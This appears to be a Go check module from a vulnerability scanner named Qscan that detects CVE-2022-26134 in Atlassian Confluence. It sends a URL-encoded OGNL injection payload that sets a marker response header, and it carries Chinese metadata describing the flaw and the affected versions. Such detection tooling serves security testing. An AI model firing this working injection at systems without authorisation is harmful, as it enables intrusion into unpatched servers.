package Confluence

import "Qscan/http"

func CVE_2022_26134(url string) (bool, map[string]string) {
	info := map[string]string{
		"漏洞名称":  "Confluence注入漏洞",
		"CVE编号": "CVE_2022_26134",
		"漏洞简介":  "Atlassian Confluence Server 和 Data Center 存在注入漏洞。攻击者利用该漏洞执行任意代码。以下产品及版本受到影响：1.3.0版本至7.4.17之前版本、7.13.0版本至7.13.7之前版本、7.14.0版本至7.14.3之前版本、7.15.0版本至 7.15.2之前版本、7.16.0版本至7.16.4之前版本、7.17.0版本至7.17.4之前版本、7.18.0版本至7.18.1之前版本。",
		"漏洞链接":  "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26134",
		"危害等级":  "高危",
	}
	resp, err := http.Get(url+"/%24%7B@com.opensymphony.webwork.ServletActionContext@getResponse%28%29.setHeader%28%22X-V-Response%22%2C%22Qscan%22%29%7D/", nil)
	if err != nil {
		return false, nil
	}
	if resp.Header["X-V-Response"] != nil {
		return true, info
	}
	return false, nil
}
